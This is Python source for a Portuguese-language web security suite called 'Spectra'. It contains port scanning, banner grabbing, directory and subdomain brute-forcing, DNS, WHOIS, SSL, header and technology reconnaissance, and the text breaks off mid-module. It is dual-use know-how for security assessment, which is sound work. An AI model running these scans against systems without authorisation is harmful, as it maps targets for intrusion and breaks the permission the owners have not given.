# -*- coding: utf-8 -*-
import socket
import sys
import argparse
from datetime import datetime, timedelta
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import concurrent.futures
import re
from urllib.parse import urljoin, urlparse, urlunparse, parse_qs, urlencode
import ssl
import warnings
from collections import Counter
from difflib import SequenceMatcher
import time
import json
import os
import itertools
import re
import logging

# Tenta importar bibliotecas de terceiros e avisa se não estiverem instaladas
try:
    import requests
    from PIL import Image
    from PIL.ExifTags import TAGS
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import concurrent.futures
    from rich.syntax import Syntax
    from rich.panel import Panel
    from rich.text import Text
    import dns.resolver
    from bs4 import BeautifulSoup
    import whois
    from OpenSSL import crypto
except ImportError:
    print("[!] Erro: Bibliotecas necessárias não encontradas.")
    print("[!] Por favor, instale-as com: pip install -r requirements.txt")
    sys.exit(1)

# --- AVISO LEGAL ---
# Este script foi criado para fins estritamente educacionais.
# O autor não se responsabiliza pelo mau uso desta ferramenta.
# Use-o apenas em sistemas e redes para os quais você tenha
# permissão explícita para testar. O acesso não autorizado
# a sistemas de computador é ilegal e não recomendado.

# --- CONFIGURAÇÃO INICIAL ---
console = Console()
# Suprime avisos para uma saída mais limpa
warnings.filterwarnings("ignore", category=DeprecationWarning)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
CACHE_DIR = ".spectra_cache"
CVE_CACHE_FILE = os.path.join(CACHE_DIR, "cve_cache.json")
CACHE_DURATION_HOURS = 24


# --- BANNER ---
def display_banner():
    """Exibe o banner da ferramenta e as informações iniciais."""
    banner = """
    
 ░▒▓███████▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓██████▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓███████▓▒░░▒▓████████▓▒░ 
       ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 

"""
    version = "3.2.6" # Versão com refatoração completa do módulo Brute Force
    console.print(f"[bold cyan]{banner}[/bold cyan]")
    console.print(f"[bold]Spectra - Web Security Suite v{version}[/bold]")
    console.print("[italic]Uma ferramenta de hacking ético para análise de segurança web.[/italic]")
    console.print("-" * 60)

# --- MÓDULO 1: SCANNER DE PORTAS ---

def scan_port(target_ip, port, grab_banner_flag):
    """Tenta conectar a uma porta, retorna serviço e opcionalmente o banner."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            if s.connect_ex((target_ip, port)) == 0:
                try:
                    service = socket.getservbyport(port, 'tcp')
                except OSError:
                    service = "Desconhecido"
                
                banner = ""
                if grab_banner_flag:
                    try:
                        s.settimeout(2) # Timeout maior para receber o banner
                        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                    except Exception:
                        banner = "(Não foi possível obter)"

                return (port, service, banner)
    except socket.error:
        pass
    return None

def parse_ports(port_spec):
    """Analisa a especificação de portas (ex: '80', '80,443', '1-1024')."""
    ports = set()
    if not port_spec:
        return []
    if '-' in port_spec:
        try:
            start, end = map(int, port_spec.split('-'))
            if 0 < start <= end < 65536:
                ports.update(range(start, end + 1))
            else:
                raise ValueError
        except ValueError:
            console.print(f"[bold red][!] Erro: Intervalo de portas inválido '{port_spec}'.[/bold red]")
            sys.exit(1)
    elif ',' in port_spec:
        try:
            ports.update(int(p.strip()) for p in port_spec.split(','))
        except ValueError:
            console.print(f"[bold red][!] Erro: Lista de portas inválida '{port_spec}'.[/bold red]")
            sys.exit(1)
    else:
        try:
            ports.add(int(port_spec))
        except ValueError:
            console.print(f"[bold red][!] Erro: Número de porta inválido '{port_spec}'.[/bold red]")
            sys.exit(1)
    return sorted(list(ports))

def scan_ports_threaded(host, port_spec, verbose, grab_banner_flag, workers=100):
    """Escaneia portas em um host usando threads para mais velocidade."""
    try:
        target_ip = socket.gethostbyname(host)
    except socket.gaierror:
        console.print(f"[bold red][!] Erro: O nome do host '{host}' não pôde ser resolvido.[/bold red]")
        return

    ports_to_scan = parse_ports(port_spec)
    if not ports_to_scan:
        return

    console.print("-" * 60)
    console.print(f"[*] Escaneando o alvo: [bold cyan]{target_ip}[/bold cyan]")
    console.print(f"[*] Portas a escanear: [bold cyan]{len(ports_to_scan)}[/bold cyan]")
    console.print(f"[*] Hora de início: [bold cyan]{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}[/bold cyan]")
    console.print("-" * 60)

    open_ports = []
    with ThreadPoolExecutor(max_workers=workers) as executor:
        future_to_port = {executor.submit(scan_port, target_ip, port, grab_banner_flag): port for port in ports_to_scan}
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeRemainingColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[green]Escaneando Portas...", total=len(ports_to_scan))
            for future in as_completed(future_to_port):
                result = future.result()
                if result is not None:
                    port, service, banner = result
                    open_ports.append(result)
                    if not verbose:
                        console.print(f"[bold green][+] Porta {port} ({service}): Aberta[/bold green]")
                progress.update(task, advance=1)

    console.print("-" * 60)
    console.print("[*] Varredura de portas concluída.")
    if open_ports:
        table = Table(title=f"Relatório de Portas Abertas em {host}")
        table.add_column("Porta", justify="center", style="cyan")
        table.add_column("Status", justify="center", style="green")
        table.add_column("Serviço", style="magenta")
        if grab_banner_flag:
            table.add_column("Banner", style="yellow")
        open_ports.sort()
        for port, service, banner in open_ports:
            row = [str(port), "Aberta", service]
            if grab_banner_flag:
                row.append(banner)
            table.add_row(*row)
        console.print(table)
    else:
        console.print("\n[bold yellow][-] Nenhuma porta aberta encontrada no intervalo especificado.[/bold yellow]")
    console.print("-" * 60)

# --- MÓDULO 2: CAPTURA DE BANNER ---

def grab_banner(host, port):
    """Tenta se conectar a uma porta e capturar o banner do serviço."""
    console.print("-" * 60)
    console.print(f"[*] Capturando banner de [bold cyan]{host}:{port}[/bold cyan]")
    console.print("-" * 60)
    try:
        with console.status(f"[bold green]Conectando em {host}:{port}...[/bold green]"):
            with socket.socket() as s:
                s.settimeout(4)
                s.connect((host, port))
                banner = s.recv(2048).decode('utf-8', errors='ignore').strip()
        
        if banner:
            console.print(f"[bold green][+] Banner da porta {port}:[/bold green]")
            console.print(banner)
        else:
            console.print(f"[bold yellow][-] Porta {port}: Banner vazio ou não recebido.[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red][!] Erro ao conectar na porta {port}: {e}[/bold red]")
    console.print("-" * 60)

# --- MÓDULO 3: SCANNER DE DIRETÓRIOS WEB ---

def check_directory(url, session):
    """Verifica se uma URL específica existe e retorna seu status e local de redirecionamento."""
    try:
        with session.get(url, timeout=5, allow_redirects=False, stream=True, verify=False) as response:
            if response.status_code != 404:
                location = response.headers.get('Location', '')
                return (url, response.status_code, location)
    except requests.exceptions.RequestException:
        pass
    return None

def discover_directories(base_url, wordlist, workers=30, recursive=False, max_depth=2, current_depth=1, visited_urls=None, internal_call=False):
    """Executa a varredura de diretórios, com suporte a recursividade."""
    if visited_urls is None:
        visited_urls = set()

    if not re.match(r'^https?://', base_url):
        base_url = 'http://' + base_url
    if base_url.endswith('/'):
        base_url = base_url[:-1]

    if not internal_call:
        console.print("-" * 60)
        console.print(f"[*] Alvo Principal: [bold cyan]{base_url}[/bold cyan]")
        if isinstance(wordlist, str):
            console.print(f"[*] Wordlist: [bold cyan]{wordlist}[/bold cyan]")
        console.print(f"[*] Modo Recursivo: {'[bold green]Ativado[/bold green]' if recursive else '[bold red]Desativado[/bold red]'}")
        if recursive:
            console.print(f"[*] Profundidade Máxima: [bold cyan]{max_depth}[/bold cyan]")
        console.print("-" * 60)

    words = []
    if isinstance(wordlist, str):
        try:
            with open(wordlist, 'r', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            console.print(f"[bold red][!] Erro: O ficheiro da wordlist '{wordlist}' não foi encontrado.[/bold red]")
            return []
    elif isinstance(wordlist, list):
        words = wordlist

    if not internal_call:
        console.print(f"[*] Nível {current_depth}: Varrendo {len(words)} palavras em [cyan]{base_url}[/cyan]...")
    
    found_paths = []
    directories_to_scan_next = []
    
    with requests.Session() as session:
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})
        with ThreadPoolExecutor(max_workers=workers) as executor:
            urls_to_check = [f"{base_url}/{word}" for word in words]
            urls_to_check = [url for url in urls_to_check if url not in visited_urls]
            future_to_url = {executor.submit(check_directory, url, session): url for url in urls_to_check}
            
            for url in urls_to_check:
                visited_urls.add(url)
            
            def process_result(result):
                if result:
                    url, status_code, location = result
                    is_directory = (str(status_code).startswith('3') and location.endswith('/')) or (status_code == 200 and url.endswith('/'))
                    
                    if not internal_call:
                        color = "green" if status_code == 200 else "yellow" if str(status_code).startswith('3') else "white"
                        console.print(f"[bold {color}][+] Encontrado: {url} (Status: {status_code})[/bold {color}]")
                    
                    found_paths.append(result)
                    
                    if recursive and is_directory and current_depth < max_depth:
                        next_scan_url = url
                        if location:
                            next_scan_url = urljoin(base_url, location)
                        
                        directories_to_scan_next.append(next_scan_url)

            if internal_call:
                for future in as_completed(future_to_url):
                    process_result(future.result())
            else:
                progress_bar_desc = f"Nível {current_depth} Scan"
                with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=True) as progress:
                    task = progress.add_task(f"[green]{progress_bar_desc}", total=len(future_to_url))
                    for future in as_completed(future_to_url):
                        process_result(future.result())
                        progress.update(task, advance=1)

    for directory_url in directories_to_scan_next:
        found_paths.extend(discover_directories(directory_url, wordlist, workers, recursive, max_depth, current_depth + 1, visited_urls, internal_call=False))
    
    return found_paths

# --- MÓDULO 4: EXTRATOR DE METADADOS ---

def extract_metadata(image_url):
    """Descarrega uma imagem de um URL e extrai os seus metadados EXIF."""
    console.print("-" * 60)
    console.print(f"[*] A extrair metadados de: [bold cyan]{image_url}[/bold cyan]")
    console.print("-" * 60)
    try:
        with console.status("[bold green]A descarregar e analisar a imagem...[/bold green]"):
            response = requests.get(image_url, timeout=10, verify=False)
            response.raise_for_status()
            img = Image.open(BytesIO(response.content))
            exif_data = img._getexif()

        if not exif_data:
            console.print("[bold yellow][-] Não foram encontrados metadados EXIF nesta imagem.[/bold yellow]")
            return
            
        table = Table(title="Metadados EXIF Encontrados")
        table.add_column("Tag", justify="right", style="cyan", no_wrap=True)
        table.add_column("Valor", style="magenta")
        for tag_id, value in exif_data.items():
            tag_name = TAGS.get(tag_id, tag_id)
            value_str = value.decode('utf-8', errors='ignore') if isinstance(value, bytes) else str(value)
            table.add_row(str(tag_name), value_str)
        console.print(table)

    except requests.exceptions.RequestException as e:
        console.print(f"[bold red][!] Erro ao descarregar a imagem: {e}[/bold red]")
    except IOError:
        console.print("[bold red][!] Erro: O ficheiro não é uma imagem válida ou está corrompido.[/bold red]")
    except Exception as e:
        console.print(f"[bold red][!] Ocorreu um erro inesperado: {e}[/bold red]")
    console.print("-" * 60)

# --- MÓDULO 5: SCANNER DE SUBDOMÍNIOS ---

def check_subdomain(subdomain, domain):
    """Verifica se um subdomínio existe tentando resolver seu endereço IP."""
    if not subdomain:
        return None
    full_domain = f"{subdomain}.{domain}"
    try:
        ip_address = socket.gethostbyname(full_domain)
        return (full_domain, ip_address)
    except (socket.gaierror, UnicodeEncodeError):
        return None

def discover_subdomains(domain, wordlist_path, workers=100):
    """Executa a varredura de subdomínios usando uma wordlist e threads."""
    console.print("-" * 60)
    console.print(f"[*] Domínio Alvo: [bold cyan]{domain}[/bold cyan]")
    console.print(f"[*] Wordlist: [bold cyan]{wordlist_path}[/bold cyan]")
    console.print("-" * 60)
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            subdomains = [line.strip() for line in f if line.strip() and not line.startswith('#') and line.strip() not in ('.', '..')]
    except FileNotFoundError:
        console.print(f"[bold red][!] Erro: O ficheiro da wordlist '{wordlist_path}' não foi encontrado.[/bold red]")
        return
    console.print(f"[*] A iniciar a varredura com {len(subdomains)} palavras...")
    found_subdomains = []
    with ThreadPoolExecutor(max_workers=workers) as executor:
        future_to_subdomain = {executor.submit(check_subdomain, sub, domain): sub for sub in subdomains}
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console) as progress:
            task = progress.add_task("[green]Buscando Subdomínios...", total=len(subdomains))
            for future in as_completed(future_to_subdomain):
                result = future.result()
                if result:
                    full_domain, ip_address = result
                    console.print(f"[bold green][+] Encontrado: {full_domain} -> {ip_address}[/bold green]")
                    found_subdomains.append(result)
                progress.update(task, advance=1)

    console.print("-" * 60)
    console.print("[*] Varredura de subdomínios concluída.")
    if found_subdomains:
        table = Table(title=f"Relatório de Subdomínios para {domain}")
        table.add_column("Subdomínio Encontrado", style="cyan")
        table.add_column("Endereço IP", style="magenta")
        for full_domain, ip_address in sorted(found_subdomains):
            table.add_row(full_domain, ip_address)
        console.print(table)
    else:
        console.print(f"[bold yellow][-] Nenhum subdomínio encontrado com esta wordlist.[/bold yellow]")
    console.print("-" * 60)

# --- MÓDULO 6: CONSULTA DE DNS ---

def query_dns(domain, record_type):
    """Consulta registros DNS para um domínio. Suporta 'ALL' para múltiplos tipos."""
    console.print("-" * 60)
    console.print(f"[*] Consultando registros para [bold cyan]{domain}[/bold cyan]")
    console.print("-" * 60)

    record_types = ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME'] if record_type.upper() == 'ALL' else [record_type.upper()]
    
    resolver = dns.resolver.Resolver()
    resolver.lifetime = 10

    with console.status("[bold green]Consultando registros DNS...[/bold green]") as status:
        for r_type in record_types:
            status.update(f"[bold green]Consultando registro {r_type}...[/bold green]")
            try:
                answers = resolver.resolve(domain, r_type)
                
                table = Table(title=f"Registros {r_type} para {domain}")
                
                if r_type == 'MX':
                    table.add_column("Prioridade", style="cyan", justify="center")
                    table.add_column("Servidor de E-mail", style="magenta")
                    mx_records = sorted([(rdata.preference, str(rdata.exchange)) for rdata in answers])
                    for preference, exchange in mx_records:
                        table.add_row(str(preference), exchange)
                elif r_type == 'TXT':
                    table.add_column("Registro TXT", style="magenta")
                    for rdata in answers:
                        text = b''.join(rdata.strings).decode('utf-8', errors='ignore')
                        table.add_row(text)
                else:
                    table.add_column("Valor", style="magenta")
                    for rdata in answers:
                        table.add_row(str(rdata))
                
                console.print(table)

            except dns.resolver.NoAnswer:
                console.print(f"[bold yellow][-] Nenhum registro {r_type} encontrado para {domain}.[/bold yellow]")
            except dns.resolver.NXDOMAIN:
                console.print(f"[bold red][!] Erro: O domínio {domain} não existe.[/bold red]")
                break 
            except dns.resolver.LifetimeTimeout:
                console.print(f"[bold red][!] Erro ao consultar {r_type}: O tempo para a consulta DNS esgotou (timeout).[/bold red]")
            except Exception as e:
                console.print(f"[bold red][!] Erro ao consultar {r_type}: {e}[/bold red]")
            console.print()

# --- MÓDULO 7: COLETOR DE LINKS ---

def normalize_url(url):
    """Normaliza uma URL removendo fragmentos e barras finais."""
    p = urlparse(url)
    path = p.path.rstrip('/') if len(p.path) > 1 else p.path
    return urlunparse((p.scheme, p.netloc, path, p.params, p.query, '')).lower()

def crawl_links(base_url, max_depth=2, output_file=None):
    """Coleta todos os links e recursos de uma página web, respeitando o domínio original."""
    console.print("-" * 60)
    console.print(f"[*] A iniciar o crawling em: [bold cyan]{base_url}[/bold cyan]")
    console.print(f"[*] Profundidade máxima: [bold cyan]{max_depth}[/bold cyan]")
    console.print("-" * 60)

    to_visit = [(base_url, 0)]
    visited_normalized = set()
    all_resources = set()
    base_netloc = urlparse(base_url).netloc
    tag_attrs = {'a': 'href', 'script': 'src', 'link': 'href', 'img': 'src', 'source': 'src'}
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console) as progress:
        task = progress.add_task("[green]Crawling...", total=None)
        while to_visit:
            current_url, depth = to_visit.pop(0)
            normalized_url = normalize_url(current_url)

            if normalized_url in visited_normalized or depth > max_depth:
                continue
                
            visited_normalized.add(normalized_url)
            progress.update(task, advance=1, description=f"Visitando: {current_url[:70]}...")

            try:
                response = requests.get(current_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'}, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
                
                for tag, attr in tag_attrs.items():
                    for t in soup.find_all(tag, **{attr: True}):
                        resource_link = t[attr]
                        full_url = urljoin(current_url, resource_link)
                        parsed_full_url = urlparse(full_url)
                        
                        if parsed_full_url.scheme in ['http', 'https']:
                            all_resources.add(full_url)
                            if tag == 'a' and parsed_full_url.netloc == base_netloc:
                                normalized_found_url = normalize_url(full_url)
                                if normalized_found_url not in visited_normalized:
                                    to_visit.append((full_url, depth + 1))
                                    
            except requests.RequestException as e:
                console.print(f"\n[bold red][!] Erro ao aceder a {current_url}: {e}[/bold red]")

    console.print("-" * 60)
    console.print(f"[*] Crawling concluído. Encontrados {len(all_resources)} recursos únicos.")
    
    sorted_resources = sorted(list(all_resources))
    
    if sorted_resources:
        table = Table(title=f"Recursos Encontrados em {base_url}")
        table.add_column("Recurso Encontrado", style="cyan")
        for link in sorted_resources:
            table.add_row(link)
        console.print(table)
        
        if output_file:
            try:
                with open(output_file, 'w', encoding='utf-8') as f:
                    for link in sorted_resources:
                        f.write(link + '\n')
                console.print(f"\n[bold green][+] Resultados salvos em: {output_file}[/bold green]")
            except IOError as e:
                console.print(f"\n[bold red][!] Erro ao salvar o arquivo: {e}[/bold red]")
    else:
        console.print("[bold yellow][-] Nenhum recurso encontrado.[/bold yellow]")
    console.print("-" * 60)

# --- MÓDULO 8: CONSULTA WHOIS ---

def get_whois_info(domain):
    """Obtém e exibe informações WHOIS para um domínio com análise de datas."""
    console.print("-" * 60)
    console.print(f"[*] Obtendo informações WHOIS para: [bold cyan]{domain}[/bold cyan]")
    console.print("-" * 60)
    try:
        with console.status(f"[bold green]Consultando servidor WHOIS para {domain}...[/bold green]"):
            w = whois.whois(domain)

        if not w.domain_name:
            console.print(f"[bold yellow][-] Nenhuma informação WHOIS encontrada para {domain}.[/bold yellow]")
            return

        table = Table(title=f"Informações WHOIS para {w.domain_name[0] if isinstance(w.domain_name, list) else w.domain_name}")
        table.add_column("Campo", style="cyan", no_wrap=True)
        table.add_column("Valor", style="magenta")

        def format_date_entry(date_value):
            if not date_value: return "N/A"
            date_obj = date_value[0] if isinstance(date_value, list) else date_value
            now = datetime.now()
            delta = abs(now - date_obj)
            
            if delta.days > 365:
                years = delta.days // 365
                months = (delta.days % 365) // 30
                duration = f"{years} anos e {months} meses"
            else:
                duration = f"{delta.days} dias"
            
            if date_obj > now:
                return f"{date_obj.strftime('%Y-%m-%d')} ([bold green]em {duration}[/bold green])"
            else:
                return f"{date_obj.strftime('%Y-%m-%d')} ([bold blue]{duration} atrás[/bold blue])"

        info_map = {
            "Domínio": w.domain_name, "Registrador": w.registrar, "Data de Criação": format_date_entry(w.creation_date),
            "Data de Expiração": format_date_entry(w.expiration_date), "Última Atualização": format_date_entry(w.updated_date),
            "Servidores de Nomes": w.name_servers, "Status": w.status, "E-mail (Admin)": w.emails,
        }

        for field, value in info_map.items():
            if value:
                value_str = "\n".join(map(str, value)) if isinstance(value, list) else str(value)
                table.add_row(field, value_str)
        
        console.print(table)

    except whois.parser.PywhoisError:
        console.print(f"[bold red][!] Erro: Não foi possível analisar a resposta WHOIS para '{domain}'. O domínio pode não ser válido ou o TLD não é suportado.[/bold red]")
    except Exception as e:
        console.print(f"[bold red][!] Ocorreu um erro inesperado ao consultar o WHOIS: {e}[/bold red]")
    console.print("-" * 60)

# --- MÓDULO 9: ANÁLISE DE CABEÇALHOS HTTP ---

def get_http_headers(url, return_findings=False):
    """Obtém, exibe e analisa os cabeçalhos de resposta HTTP de uma URL."""
    if not return_findings:
        console.print("-" * 60)
        console.print(f"[*] Analisando cabeçalhos HTTP de: [bold cyan]{url}[/bold cyan]")
        console.print("-" * 60)
    
    findings = []
    
    try:
        with console.status("[bold green]Obtendo cabeçalhos HTTP...[/bold green]", spinner="dots"):
            response = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'}, allow_redirects=True, verify=False)
        final_url = response.url
        
        if not return_findings:
            if response.history:
                console.print(f"[yellow][*] Requisição redirecionada. Analisando URL final:[bold cyan] {final_url}[/bold cyan][/yellow]")
            console.print(f"[*] Status: [bold { 'green' if response.ok else 'red' }]{response.status_code} {response.reason}[/bold { 'green' if response.ok else 'red' }]")
            console.print("-" * 60)

        headers = response.headers
        
        if not return_findings:
            table = Table(title=f"Cabeçalhos HTTP de {final_url}")
            table.add_column("Cabeçalho", style="cyan")
            table.add_column("Valor", style="magenta")
            info_disclosure_headers = ["server", "x-powered-by", "x-aspnet-version"]
            for header, value in headers.items():
                style = "yellow" if header.lower() in info_disclosure_headers else "magenta"
                table.add_row(header, f"[{style}]{value}[/{style}]")
            console.print(table)
        
        security_headers = {
            "Strict-Transport-Security": "Força o uso de HTTPS, protegendo contra ataques de downgrade.",
            "Content-Security-Policy": "Previne ataques de XSS (Cross-Site Scripting).",
            "X-Frame-Options": "Protege contra ataques de clickjacking.",
            "X-Content-Type-Options": "Previne ataques de 'MIME sniffing'.",
            "Referrer-Policy": "Controla quanta informação de referência é enviada.",
            "Permissions-Policy": "Controla quais recursos do navegador a página pode usar."
        }
        
        for header, desc in security_headers.items():
            if header not in headers:
                findings.append({
                    "Risco": "Baixo", "Tipo": "Cabeçalho de Segurança Ausente",
                    "Detalhe": f"O cabeçalho '{header}' está ausente.", "Recomendação": desc
                })

        if return_findings:
            return findings

        sec_table = Table(title="Status dos Cabeçalhos de Segurança")
        sec_table.add_column("Cabeçalho de Segurança", style="cyan")
        sec_table.add_column("Status", style="magenta")
        sec_table.add_column("Recomendação", style="white")

        for header, desc in security_headers.items():
            if header in headers:
                sec_table.add_row(header, "[bold green]Presente[/bold green]", headers[header])
            else:
                sec_table.add_row(header, "[bold red]Ausente[/bold red]", desc)
        console.print("\n[*] [bold]Análise de Cabeçalhos de Segurança[/bold]")
        console.print(sec_table)

    except requests.exceptions.ConnectionError:
        if not return_findings: console.print(f"[bold red][!] Erro de Conexão: Não foi possível conectar a '{url}'.[/bold red]")
    except requests.RequestException as e:
        if not return_findings: console.print(f"[bold red][!] Erro ao obter a URL: {e}[/bold red]")
    
    if not return_findings:
        console.print("-" * 60)
    
    return findings

# --- MÓDULO 10: ANÁLISE DE CERTIFICADO SSL/TLS ---

def get_ssl_info(hostname, port=443):
    """Obtém e exibe informações do certificado SSL/TLS."""
    console.print("-" * 60)
    console.print(f"[*] Analisando certificado SSL/TLS de: [bold cyan]{hostname}:{port}[/bold cyan]")
    console.print("-" * 60)

    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with console.status(f"[bold green]Conectando e obtendo certificado de {hostname}...[/bold green]"):
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert_der = ssock.getpeercert(True)
        
        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1, cert_der)

        table = Table(title=f"Informações do Certificado SSL/TLS para {hostname}")
        table.add_column("Campo", style="cyan", no_wrap=True)
        table.add_column("Valor", style="magenta")

        # --- Assunto e Emissor ---
        subject_str = "\n".join([f"{key.decode()}: {value.decode()}" for key, value in x509.get_subject().get_components()])
        issuer_str = "\n".join([f"{key.decode()}: {value.decode()}" for key, value in x509.get_issuer().get_components()])
        table.add_row("Assunto", subject_str)
        table.add_row("Emissor", issuer_str)
        
        # --- Verificação de Autoassinado ---
        if x509.get_subject().get_components() == x509.get_issuer().get_components():
            table.add_row("Confiança", "[bold yellow]Certificado Autoassinado (Não confiável)[/bold yellow]")

        # --- Validade ---
        valid_from = datetime.strptime(x509.get_notBefore().decode('ascii'), '%Y%m%d%H%M%SZ')
        valid_to = datetime.strptime(x509.get_notAfter().decode('ascii'), '%Y%m%d%H%M%SZ')
        table.add_row("Válido De", valid_from.strftime('%Y-%m-%d %H:%M:%S'))
        status_expiracao = f"[bold red]Expirado em {valid_to.strftime('%Y-%m-%d %H:%M:%S')}[/bold red]" if x509.has_expired() else f"[bold green]Válido até {valid_to.strftime('%Y-%m-%d %H:%M:%S')}[/bold green]"
        table.add_row("Validade", status_expiracao)

        # --- Detalhes Criptográficos ---
        pubkey = x509.get_pubkey()
        key_type = "RSA" if pubkey.type() == crypto.TYPE_RSA else "ECC" if pubkey.type() == crypto.TYPE_EC else "Outro"
        table.add_row("Chave Pública", f"{key_type} ({pubkey.bits()} bits)")
        table.add_row("Algoritmo de Assinatura", x509.get_signature_algorithm().decode('utf-8'))
        table.add_row("Nº de Série", str(x509.get_serial_number()))
        
        # --- Nomes Alternativos (SAN) ---
        san_list = []
        for i in range(x509.get_extension_count()):
            ext = x509.get_extension(i)
            if 'subjectAltName' in str(ext.get_short_name()):
                san_list = [name.strip().replace("DNS:", "") for name in str(ext).split(',')]
        if san_list:
            table.add_row("Nomes Alternativos (SAN)", "\n".join(san_list))

        console.print(table)

    except socket.gaierror:
        console.print(f"[bold red][!] Erro: O nome do host '{hostname}' não pôde ser resolvido.[/bold red]")
    except socket.timeout:
        console.print(f"[bold red][!] Erro: Tempo de conexão esgotado para '{hostname}:{port}'.[/bold red]")
    except ConnectionRefusedError:
        console.print(f"[bold red][!] Erro: Conexão recusada por '{hostname}:{port}'.[/bold red]")
    except ssl.SSLError as e:
        console.print(f"[bold red][!] Erro de SSL: {e}.[/bold red]")
    except Exception as e:
        console.print(f"[bold red][!] Ocorreu um erro inesperado: {e}[/bold red]")
    console.print("-" * 60)

# --- MÓDULO 11: DETECÇÃO DE TECNOLOGIAS ---

def detect_technologies(url, return_findings=False):
    """Analisa uma URL para detectar tecnologias web, CMS, frameworks, e infere a base de dados."""
    if not return_findings:
        console.print("-" * 60)
        console.print(f"[*] Detectando tecnologias em: [bold cyan]{url}[/bold cyan]")
        console.print("-" * 60)

    findings = {
        "Servidor Web": set(), "CMS / Frameworks": set(), "Linguagem de Backend": set(),
        "Bibliotecas JavaScript": set(), "Ferramentas de Análise": set(), "Base de Dados": set()
    }
    
    try:
        if not return_findings:
            with console.status("[bold green]Analisando a página e cabeçalhos...[/bold green]", spinner="dots"):
                response = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'}, allow_redirects=True, verify=False)
        else:
            response = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'}, allow_redirects=True, verify=False)

        final_url = response.url
        if response.history and not return_findings:
            console.print(f"[yellow][*] Requisição redirecionada. Analisando URL final:[bold cyan] {final_url}[/bold cyan][/yellow]")
        
        headers = response.headers
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Análise de Cabeçalhos e Cookies
        if 'Server' in headers: findings["Servidor Web"].add(headers['Server'])
        if 'X-Powered-By' in headers: findings["Linguagem de Backend"].add(headers['X-Powered-By'])
        if 'Set-Cookie' in headers:
            cookies = headers['Set-Cookie']
            if 'wp-settings' in cookies: findings["CMS / Frameworks"].add('WordPress')
            if 'joomla' in cookies: findings["CMS / Frameworks"].add('Joomla')
            if 'PHPSESSID' in cookies: findings["Linguagem de Backend"].add('PHP')
            if 'JSESSIONID' in cookies: findings["Linguagem de Backend"].add('Java/JSP')

        # Análise de Conteúdo HTML
        generator_tag = soup.find('meta', attrs={'name': 'generator'})
        if generator_tag and generator_tag.get('content'):
            findings["CMS / Frameworks"].add(generator_tag.get('content'))

        scripts_and_links = [s.get('src', '') for s in soup.find_all('script')] + [l.get('href', '') for l in soup.find_all('link')]
        tech_signatures = {
            "jQuery": "jquery", "React": "react", "Vue.js": "vue", "Angular": "angular",
            "Bootstrap": "bootstrap", "WordPress": "/wp-content/", "Joomla": "/media/joomla/"
        }
        for tech, sig in tech_signatures.items():
            if any(sig in s for s in scripts_and_links if s):
                category = "Bibliotecas JavaScript" if tech in ["jQuery", "React", "Vue.js", "Angular", "Bootstrap"] else "CMS / Frameworks"
                findings[category].add(tech)
        
        # Inferência da Base de Dados
        error_patterns = {
